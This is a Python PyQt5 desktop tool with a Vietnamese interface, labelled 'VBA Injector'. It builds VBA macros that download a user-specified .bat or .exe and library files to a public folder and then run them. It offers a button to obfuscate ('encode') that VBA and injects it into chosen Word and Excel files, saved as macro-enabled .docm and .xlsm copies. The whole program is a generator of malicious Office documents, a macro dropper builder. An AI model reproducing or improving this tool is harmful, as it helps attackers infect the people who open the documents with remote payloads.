import sys
import os
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QTextEdit,
    QLineEdit, QListWidget, QFileDialog, QMessageBox, QListWidgetItem
)
from PyQt5.QtGui import QIcon 
from ultis.base import VBAEncoder
from ultis.injector import VBAInjector
from ultis.original import OriginalBuilder

UPLOAD_FOLDER = 'uploads'
GENERATED_FOLDER = 'generated'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(GENERATED_FOLDER, exist_ok=True)

class VBAInjectorApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("VBA Injector Desktop App")
        self.setGeometry(100, 100, 1200, 700)
        self.setStyleSheet("""
        QWidget {
            background-color: #2b2b2b;
            color: white;
            font-size: 14px;
        }
        QPushButton {
            background-color: #3c3f41;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            padding: 5px;
        }
        QPushButton:hover {
            background-color: #4b6eaf;
        }
        QLineEdit, QListWidget {
            background-color: #3c3f41;
            color: white;
            border: 1px solid #555;
            border-radius: 3px;
        }
    """)
        self.setWindowIcon(QIcon('logo.png')) 
        self.url_list = []
        self.path_list = []
        self.main_file_path = ""

        self.library_entries = []
        self.uploaded_files = []
        self.generated_files = []

        self.initUI()

    def initUI(self):
        main_layout = QVBoxLayout()

        # --- Execute File ---
        execute_layout = QHBoxLayout()
        self.execute_url_input = QLineEdit()
        self.execute_url_input.setPlaceholderText("URL file thực thi (.bat/.exe)")
        self.execute_path_input = QLineEdit()
        self.execute_path_input.setText(r"C:\Users\Public\Documents\\")
        self.execute_path_input.setPlaceholderText("Vị trí lưu file thực thi")

        execute_layout.addWidget(QLabel("Execute URL:"))
        execute_layout.addWidget(self.execute_url_input)
        execute_layout.addWidget(QLabel("Save Path:"))
        execute_layout.addWidget(self.execute_path_input)
        main_layout.addLayout(execute_layout)

        # --- Library Files ---
        library_layout = QVBoxLayout()
        self.library_area = QVBoxLayout()
        library_layout.addWidget(QLabel("Library Files:"))
        add_library_btn = QPushButton("Add Library File")
        add_library_btn.clicked.connect(self.add_library_entry)
        library_layout.addLayout(self.library_area)
        library_layout.addWidget(add_library_btn)

        main_layout.addLayout(library_layout)
        # --- VBA Code Area ---
        vba_area_layout = QVBoxLayout()

        button_layout = QHBoxLayout()
        generate_vba_btn = QPushButton("Tạo VBA")
        generate_vba_btn.clicked.connect(self.generate_vba_code)

        encode_vba_btn = QPushButton("Mã hoá VBA")
        encode_vba_btn.clicked.connect(self.encode_vba_code)

        button_layout.addWidget(generate_vba_btn)
        button_layout.addWidget(encode_vba_btn)

        self.vba_textbox = QTextEdit()
        self.vba_textbox.setPlaceholderText("VBA code sẽ hiển thị ở đây...")

        vba_area_layout.addLayout(button_layout)
        vba_area_layout.addWidget(self.vba_textbox)

        main_layout.addLayout(vba_area_layout)

        # --- Upload & Generate ---
        upload_gen_layout = QHBoxLayout()

        # Uploaded Files
        upload_layout = QVBoxLayout()
        upload_label = QLabel("Uploaded Files:")
        self.upload_list = QListWidget()

        add_file_btn = QPushButton("Add File")
        add_file_btn.clicked.connect(self.add_file)
        delete_all_btn = QPushButton("Delete All Uploaded Files")
        delete_all_btn.clicked.connect(self.delete_all_uploaded_files)

        upload_layout.addWidget(upload_label)
        upload_layout.addWidget(self.upload_list)
        upload_layout.addWidget(add_file_btn)
        upload_layout.addWidget(delete_all_btn)
        
         #Quick Inject Button
        quick_inject_btn = QPushButton("⚡ Quick Inject ⚡")
        quick_inject_btn.setStyleSheet("font-size: 18px; padding: 15px; background-color: #4caf50;")
        quick_inject_btn.clicked.connect(self.quick_inject_vba)
        # Center Button
        inject_layout = QVBoxLayout()
        inject_btn = QPushButton("➡️ Inject VBA ➡️")
        inject_btn.setStyleSheet("font-size: 20px; padding: 20px;")
        inject_btn.clicked.connect(self.inject_vba)
        inject_layout.addStretch()
        inject_layout.addWidget(quick_inject_btn)
        inject_layout.addSpacing(10)
        inject_layout.addWidget(inject_btn)
        inject_layout.addStretch()

        # Generated Files
        generate_layout = QVBoxLayout()
        generate_label = QLabel("Generated Files:")
        self.generated_list = QListWidget()

        save_file_btn = QPushButton("Save Generated File")
        save_file_btn.clicked.connect(self.save_generated_file)

        back_btn = QPushButton("Back (Clear Generated List)")
        back_btn.clicked.connect(self.clear_generated_list)

        generate_layout.addWidget(generate_label)
        generate_layout.addWidget(self.generated_list)
        generate_layout.addWidget(save_file_btn)
        generate_layout.addWidget(back_btn)

        upload_gen_layout.addLayout(upload_layout, 4)
        upload_gen_layout.addLayout(inject_layout, 1)
        upload_gen_layout.addLayout(generate_layout, 4)

        main_layout.addLayout(upload_gen_layout)

        self.setLayout(main_layout)

    def add_library_entry(self):
        entry_layout = QHBoxLayout()
        url_input = QLineEdit()
        url_input.setPlaceholderText("Library URL")
        path_input = QLineEdit()
        path_input.setPlaceholderText("Library Save Path")
        path_input.setText(r"C:\Users\Public\Documents\\")
        remove_btn = QPushButton("X")
        remove_btn.clicked.connect(lambda: self.remove_library_entry(entry_layout))

        entry_layout.addWidget(url_input)
        entry_layout.addWidget(path_input)
        entry_layout.addWidget(remove_btn)

        self.library_area.addLayout(entry_layout)
        self.library_entries.append((url_input, path_input))

    def remove_library_entry(self, entry_layout):
        for i in reversed(range(entry_layout.count())):
            widget = entry_layout.itemAt(i).widget()
            if widget:
                widget.setParent(None)

    def add_file(self):
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(self, "Select File", "", "Office Files (*.docx *.xlsx)")
        if file_path:
            filename = os.path.basename(file_path)
            dest_path = os.path.abspath(os.path.join(UPLOAD_FOLDER, filename))

            with open(file_path, 'rb') as src_file:
                with open(dest_path, 'wb') as dst_file:
                    dst_file.write(src_file.read())

            self.uploaded_files.append(dest_path)

            # 🛠 Hiển thị thông tin chi tiết
            info = self.get_file_info(dest_path)
            item = QListWidgetItem(info)
            self.upload_list.addItem(item)


    def get_file_info(self, file_path):
        name = os.path.basename(file_path)
        size_kb = os.path.getsize(file_path) // 1024
        ext = os.path.splitext(file_path)[1].lower()
        if ext in ['.docx', '.docm']:
            file_type = "Word"
        elif ext in ['.xlsx', '.xlsm']:
            file_type = "Excel"
        else:
            file_type = "Unknown"
        return f"{name} | {file_type} | {size_kb} KB"

    def delete_uploaded_file(self, path, item):
        if path in self.uploaded_files:
            self.uploaded_files.remove(path)
        self.upload_list.takeItem(self.upload_list.row(item))

    def delete_all_uploaded_files(self):
        self.uploaded_files.clear()
        self.upload_list.clear()

    def inject_vba(self):
        execute_url = self.execute_url_input.text().strip()
        execute_path = self.execute_path_input.text().strip()
        if not execute_path:
            execute_path = r"C:\Users\Public\Documents\\"
        if not execute_url or not execute_path:
            QMessageBox.warning(self, "Lỗi", "Vui lòng nhập URL và Path!")
            return

        library_urls = []
        library_paths = []

        for url_input, path_input in self.library_entries:
            url = url_input.text().strip()
            path = path_input.text().strip()
            if url and path:
                library_urls.append(url)
                library_paths.append(path)

        url_list = [execute_url] + library_urls
        path_list = [execute_path] + library_paths

        if not execute_path.endswith("\\") and not execute_path.endswith("/"):
            execute_path += "\\"
        filename = execute_url.split('/')[-1]
        main_file_path = execute_path + filename

        vba_code = self.vba_textbox.toPlainText()
        if not vba_code.strip():
            QMessageBox.warning(self, "Lỗi", "Chưa có VBA code để inject!")
            return
        
        injector = VBAInjector()
        self.generated_list.clear()

        for file_path in self.uploaded_files:
            filename = os.path.basename(file_path)
            if filename.endswith('.docx'):
                output_filename = filename.replace('.docx', '.docm')
            elif filename.endswith('.xlsx'):
                output_filename = filename.replace('.xlsx', '.xlsm')
            else:
                continue

            output_path = os.path.abspath(os.path.join(GENERATED_FOLDER, output_filename))
            injector.inject_vba_to_office(file_path, output_path, vba_code)

            info = self.get_file_info(output_path)
            self.generated_list.addItem(info)

        QMessageBox.information(self, "Thành công", "Đã nhúng VBA vào tất cả file!")

    def quick_inject_vba(self):
        execute_url = self.execute_url_input.text().strip()
        execute_path = self.execute_path_input.text().strip()

        if not execute_url:
            QMessageBox.warning(self, "Lỗi", "Vui lòng nhập Execute URL!")
            return

        if not execute_path:
            execute_path = r"C:\Users\Public\Documents\\"

        library_urls = []
        library_paths = []

        for url_input, path_input in self.library_entries:
            url = url_input.text().strip()
            path = path_input.text().strip()
            if url and path:
                library_urls.append(url)
                library_paths.append(path)

        url_list = [execute_url] + library_urls
        path_list = [execute_path] + library_paths

        filename = execute_url.split('/')[-1]
        main_file_path = os.path.join(execute_path, filename)

        encoder = VBAEncoder()
        vba_code = encoder.generate_encoded_vba(url_list, path_list, main_file_path)

        injector = VBAInjector()
        self.generated_list.clear()

        for file_path in self.uploaded_files:
            filename = os.path.basename(file_path)
            if filename.endswith('.docx'):
                output_filename = filename.replace('.docx', '.docm')
            elif filename.endswith('.xlsx'):
                output_filename = filename.replace('.xlsx', '.xlsm')
            else:
                continue

            output_path = os.path.abspath(os.path.join(GENERATED_FOLDER, output_filename))
            injector.inject_vba_to_office(file_path, output_path, vba_code)

            info = self.get_file_info(output_path)
            self.generated_list.addItem(info)

        QMessageBox.information(self, "Thành công", "Đã Quick Inject thành công vào tất cả file!")

    def save_generated_file(self):
        selected_items = self.generated_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Lỗi", "Chọn file cần lưu!")
            return
        filename_info = selected_items[0].text().split(" | ")[0]
        src_path = os.path.join(GENERATED_FOLDER, filename_info)

        save_path, _ = QFileDialog.getSaveFileName(self, "Save File", filename_info)
        if save_path:
            with open(src_path, 'rb') as src_file:
                with open(save_path, 'wb') as dst_file:
                    dst_file.write(src_file.read())
            QMessageBox.information(self, "Thành công", f"Đã lưu file: {save_path}")

    def clear_generated_list(self):
        self.generated_list.clear()
    def generate_vba_code(self):
        execute_url = self.execute_url_input.text().strip()
        execute_path = self.execute_path_input.text().strip()

        if not execute_url:
            QMessageBox.warning(self, "Lỗi", "Vui lòng nhập Execute URL!")
            return

        if not execute_path:
            execute_path = r"C:\Users\Public\Documents\\"

        library_urls = []
        library_paths = []

        for url_input, path_input in self.library_entries:
            url = url_input.text().strip()
            path = path_input.text().strip()
            if url and path:
                library_urls.append(url)
                library_paths.append(path)

        # Build từ OriginalBuilder
        builder = OriginalBuilder()
        url_list = [execute_url] + library_urls
        path_list = [execute_path] + library_paths
        filename = execute_url.split('/')[-1]
        main_file_path = os.path.join(execute_path, filename)

        sub_a = builder.build_sub_a(url_list, path_list)
        sub_b = builder.build_sub_b(main_file_path)

        final_vba = sub_a + '\n' + sub_b
        self.vba_textbox.setPlainText(final_vba)
    def encode_vba_code(self):
        raw_vba = self.vba_textbox.toPlainText()
        if not raw_vba.strip():
            QMessageBox.warning(self, "Lỗi", "Chưa có VBA code để mã hóa!")
            return

        encoder = VBAEncoder()
        encoded_vba = encoder.convert_vba_string(raw_vba)
        self.vba_textbox.setPlainText(encoded_vba)
if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = VBAInjectorApp()
    window.show()
    sys.exit(app.exec_())
